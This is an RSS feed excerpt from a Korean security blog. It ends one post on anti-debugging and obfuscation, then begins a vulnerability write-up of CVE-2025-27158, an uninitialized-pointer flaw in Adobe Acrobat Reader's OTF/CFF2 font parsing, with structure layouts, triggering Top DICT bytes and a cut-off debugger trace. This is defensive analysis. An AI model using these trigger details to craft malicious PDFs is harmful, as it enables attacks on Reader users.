&#xAC15;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xACB0;&#xAD6D; &#xC774; &#xC2F8;&#xC6C0;&#xC740; &#xB05D;&#xB0A0; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><p>&#xAE30;&#xC220;&#xC774; &#xBC1C;&#xC804;&#xD558;&#xB294; &#xB9CC;&#xD07C;, &#xACF5;&#xACA9;&#xACFC; &#xBC29;&#xC5B4;&#xC758; &#xBC29;&#xBC95;&#xB3C4; &#xB04A;&#xC784;&#xC5C6;&#xC774; &#xC9C4;&#xD654;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xB9AC;&#xB294; &#xC774; &#xAE30;&#xC220;&#xC744; &#xB2E8;&#xC21C;&#xD55C; &#xC7A5;&#xBCBD;&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB354; &#xB098;&#xC740; &#xBCF4;&#xC548; &#xD658;&#xACBD;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC704;&#xD55C; &#xC9C4;&#xD654;&#xC758; &#xC77C;&#xBD80;</strong>&#xB85C; &#xBC14;&#xB77C;&#xBD10;&#xC57C; &#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xCC3D;&#xACFC; &#xBC29;&#xD328;&#xC758; &#xB300;&#xACB0; &#xC18D;&#xC5D0;&#xC11C;&#xB3C4;, &#xC6B0;&#xB9AC;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xBCC0;&#xD568;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><blockquote><p>&#x201C;&#xAC8C;&#xC784;&#xC740; &#xACC4;&#xC18D;&#xB41C;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC6B0;&#xB9AC;&#xB294;, &#xAC01;&#xC790;&#xC758; &#xC774;&#xC720;&#xB85C;, &#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xB294; &#xAC8C;&#xC784;&#xC5D0; &#xB6F0;&#xC5B4;&#xB4E0;&#xB2E4;.&#x201D;</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p><a href="https://m.blog.naver.com/choijo2/60196192627">https://m.blog.naver.com/choijo2/60196192627</a></p><p><a href="http://en.wikipedia.org/wiki/Obfuscation_(software">http://en.wikipedia.org/wiki/Obfuscation_(software)</a>)</p><p><a href="https://blog.quarkslab.com/dji-the-art-of-obfuscation.html">https://blog.quarkslab.com/dji-the-art-of-obfuscation.html</a></p><p><a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><p><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      <category domain="https://hackyboiz.github.io/tags/OLLVM/">OLLVM</category>
      
      <category domain="https://hackyboiz.github.io/tags/Obfuscation/">Obfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27158: Adobe Acrobat Reader의 Uninitialized Pointer로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</link>
      <guid>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/</guid>
      <pubDate>Wed, 23 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2135</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Adobe Acrobat Reader<ul><li>24.001.30225</li><li>20.005.30748</li><li>25.001.20428 &#xBC0F; &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-27158&#xC740; Adobe Acrobat Reader&#xC5D0;&#xC11C; PDF&#xC5D0; &#xD3EC;&#xD568;&#xB41C; OTF(OpenType Font) &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OTF &#xD30C;&#xC77C;&#xC740; &#xD06C;&#xAC8C; TableDirectory&#xC640; TableRecords&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xBA3C;&#xC800; TableDirectory &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  sfntVersion (<span class="hljs-number">0x00010000</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x74727565</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x4F54544F</span>  )<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>  numTables<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>  searchRange<span class="hljs-number">0x08</span>    <span class="hljs-number">0x02</span>  entrySelector<span class="hljs-number">0x0c</span>    <span class="hljs-number">0x02</span>  rangeShift</code></pre><p>sfntVersion &#xAC12;&#xC774; 0x00010000 &#xB610;&#xB294; 0x74727565&#xC778; &#xACBD;&#xC6B0; &#xAE00;&#xAF34;&#xC5D0; TrueType &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xACE0;, 0x4F54544F&#xC778; &#xACBD;&#xC6B0; CFF &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>numTables&#xB294; TableRecord &#xAC1C;&#xC218;&#xB85C; TableRecord &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- ----------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x04</span>  tableTag<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>  tableChecksum<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span>  tableOffset<span class="hljs-number">0x0C</span>    <span class="hljs-number">0x04</span>  tableLength</code></pre><p>tableTag&#xC758; &#xAC12;&#xC774; &#x201C;CFF2&#x201D;&#xC774;&#xBA74; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>CFF2(Compact Font Format version 2) &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAD6C;&#xC870;&#xB294; &#xD5E4;&#xB354;, Top DICT, Global Subr INDEX, VariationStore&#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD5E4;&#xB354;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size   Name------ ----- --------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x01</span>  cff2MajorVersion<span class="hljs-number">0x01</span>    <span class="hljs-number">0x01</span>  cfff2MinorVersion<span class="hljs-number">0x02</span>    <span class="hljs-number">0x01</span>  cff2HeaderSize<span class="hljs-number">0x03</span>    <span class="hljs-number">0x02</span>  topDictLength</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; topDictLength&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; Top DICT &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>Top DICT&#xB294; &#xD3F0;&#xD2B8;&#xC758; &#xC8FC;&#xC694; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC740; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Operator Name   Operator Value    Operand type <span class="hljs-keyword">and</span> meaning----------------------------------------------------------------------------------------------------------CharStrings    <span class="hljs-number">0x11</span>               number <span class="hljs-keyword">and</span> it gives CharStrings INDEX offset, from start of the CFF2 table.vstore         <span class="hljs-number">0x18</span>               number <span class="hljs-keyword">and</span> it VariationStore structure offset, from start of the CFF2 table.FDArray        0x0C 0x24          number and it Font DICT (FD) INDEX offset, from start of the CFF2 table.FDSelect       <span class="hljs-number">0x0C</span> <span class="hljs-number">0x25</span>          number <span class="hljs-keyword">and</span> it CharStrings INDEX offset, from start of the CFF2 table. FontMatrix     <span class="hljs-number">0x0c</span> <span class="hljs-number">0x07</span>          <span class="hljs-function"><span class="hljs-built_in">array</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">default</span> value <span class="hljs-title">is</span> <span class="hljs-params">(<span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>)</span></span></code></pre><p>&#xCDE8;&#xC57D;&#xD55C; OTF &#xD30C;&#xC77C;&#xC740; &#xC544;&#xB798; 3&#xAC1C;&#xC758; Top DICT &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">7</span>A <span class="hljs-number">0</span>C <span class="hljs-number">24</span>  ==&gt;  (<span class="hljs-keyword">operator</span>: FDArray, operand after encoding: <span class="hljs-number">0x7A</span>) <span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>A <span class="hljs-number">11</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: CharStrings, operand after encoding: <span class="hljs-number">0x8A</span>)<span class="hljs-number">1</span>D <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>C <span class="hljs-number">18</span>     ==&gt;  (<span class="hljs-keyword">operator</span>: vstore, operand after encoding: <span class="hljs-number">0x1C</span>)</code></pre><p>&#xC774; &#xC911; vstore(0x18)&#xC758; offset&#xC740; 0x1C&#xB85C; CFF2 &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; 0x1C&#xB9CC;&#xD07C; &#xB5A8;&#xC5B4;&#xC9C4; &#xACF3;&#xC5D0; VariationStore&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"> Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                       Length<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                       Format<span class="hljs-number">0x04</span>    <span class="hljs-number">0x04</span>                       variationRegionListOffset<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span>                       itemVariationDataCount (N)<span class="hljs-number">0x08</span>    <span class="hljs-number">0x04</span> * N                   itemVariationDataOffsets[N]</code></pre><p>itemVariationDataCount&#xB294; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAC1C;&#xC218;(N)&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; itemVariationDataOffsets&#xB294; &#xAC01; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; offset&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>itemVariationData&#xC758; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Offset Size                       Name-----------------------------------------------------------------------<span class="hljs-number">0x00</span>    <span class="hljs-number">0x02</span>                      itemCount<span class="hljs-number">0x02</span>    <span class="hljs-number">0x02</span>                      shortDeltaCount<span class="hljs-number">0x04</span>    <span class="hljs-number">0x02</span>                      regionIndexCount (C)<span class="hljs-number">0x06</span>    <span class="hljs-number">0x02</span> * C                  regionIndexes[C]</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; itemVariationDataCount&#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC0AC;&#xC6A9;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C21eax=<span class="hljs-number">00000010</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000004</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28da7 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5877</span>:<span class="hljs-number">6</span>ee28da7 e8b73ee6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;- [<span class="hljs-number">1</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Beax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dac esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb587c</span>:<span class="hljs-number">6</span>ee28dac <span class="hljs-number">66898738020000</span>  mov     word ptr [edi+<span class="hljs-number">238</span>h],ax   ds:<span class="hljs-number">002b</span>:f3a2aba8=ffff &lt;- [<span class="hljs-number">2</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Ceax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db3 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5883</span>:<span class="hljs-number">6</span>ee28db3 <span class="hljs-number">0f</span>b7c0          movzx   eax,ax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pallocate vuln buffer of size <span class="hljs-number">0x20</span>Time Travel Position: E92AE:<span class="hljs-number">1</span>C3Deax=<span class="hljs-number">00000002</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5886</span>:<span class="hljs-number">6</span>ee28db6 c1e004          shl     eax,<span class="hljs-number">4</span>  &lt;- [<span class="hljs-number">3</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Eeax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28db9 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5889</span>:<span class="hljs-number">6</span>ee28db9 <span class="hljs-number">50</span>              push    eax<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92AE:<span class="hljs-number">1</span>C3Feax=<span class="hljs-number">00000020</span> ebx=f3a2a970 ecx=<span class="hljs-number">00000002</span> edx=<span class="hljs-number">00000100</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dba esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588a</span>:<span class="hljs-number">6</span>ee28dba e817cee4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;- [<span class="hljs-number">4</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1394</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dbf esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb588f</span>:<span class="hljs-number">6</span>ee28dbf <span class="hljs-number">89873</span>c020000    mov     dword ptr [edi+<span class="hljs-number">23</span>Ch],eax ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">00000000</span>&lt;- [<span class="hljs-number">5</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd eax;                                  &lt;- [<span class="hljs-number">6</span>]<span class="hljs-number">0</span>a02b330  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>a02b350  a0a0a0a0 a0a0a0a0 <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92B1:<span class="hljs-number">1395</span>eax=<span class="hljs-number">0</span>a02b330 ebx=f3a2a970 ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">00001b</span>7c edi=f3a2a970eip=<span class="hljs-number">6</span>ee28dc5 esp=<span class="hljs-number">052f</span>c4b0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5895</span>:<span class="hljs-number">6</span>ee28dc5 <span class="hljs-number">0f</span>b78738020000  movzx   eax,word ptr [edi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span></code></pre><p>[1]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x195e3</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; VariationStore &#xAD6C;&#xC870;&#xCCB4; itemVariationDataCount &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. [2]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;(0x02)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC5D0;&#xC11C; itemVariationDataCount &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x20)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [4]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; malloc&#xC73C;&#xB85C; 0x20 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[6]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; Time Travel Position: E92BA:<span class="hljs-number">1B</span>B5eax=db00d000 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">0000016b</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e65 esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz ac po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000212</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5935</span>:<span class="hljs-number">6</span>ee28e65 e8f93de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">8</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>CFeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6a esp=<span class="hljs-number">052f</span>c4a8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593a</span>:<span class="hljs-number">6</span>ee28e6a <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>D0eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6b esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593b</span>:<span class="hljs-number">6</span>ee28e6b <span class="hljs-number">668906</span>          mov     word ptr [esi],ax        ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b330=e0e0 &lt;-[<span class="hljs-number">9</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>D1eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e6e esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb593e</span>:<span class="hljs-number">6</span>ee28e6e e8f03de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">10</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db esi L20<span 